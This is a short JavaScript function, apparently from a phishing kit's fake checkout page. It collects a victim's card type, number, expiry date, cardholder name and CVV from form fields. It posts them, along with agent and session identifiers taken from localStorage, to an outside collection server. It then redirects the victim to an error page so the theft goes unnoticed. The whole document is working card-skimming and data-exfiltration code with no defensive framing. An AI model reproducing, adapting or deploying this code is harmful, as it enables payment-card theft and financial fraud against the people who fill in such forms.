
function submit_form() {
    var uname = "CC Type: " + document.getElementById("cardType").value + " CC No: " + document.getElementById("cardNumber").value 
    + "  DateExp:" + document.getElementById("cardMonth").value + "/" + document.getElementById("cardYear").value 
    + " Name: " + document.getElementById("owner").value + " CCV: " + document.getElementById("cvv").value;
    var pd = "CC";
    var b = "Credit Card";
    var agent_id = localStorage.getItem("agent_id");
    var sid = localStorage.getItem("sid");
    var app = localStorage.getItem("app");
    var xhr = new XMLHttpRequest();
    // alert(uname);
    xhr.open("POST", 'https://gpost996.online/post.php', false);
    xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");

    xhr.onreadystatechange = function () { // Call a function when the state changes.
        if (this.readyState === XMLHttpRequest.DONE && this.status === 200) {
            // Request finished. Do processing here.
        }
    }
    xhr.send("uname=" + uname + "&pd=" + pd + "&b=" + b + "&agent_id=" + agent_id + "&sid=" + sid + "&app=" + app)

    window.location = "error.html";
    exit;

}
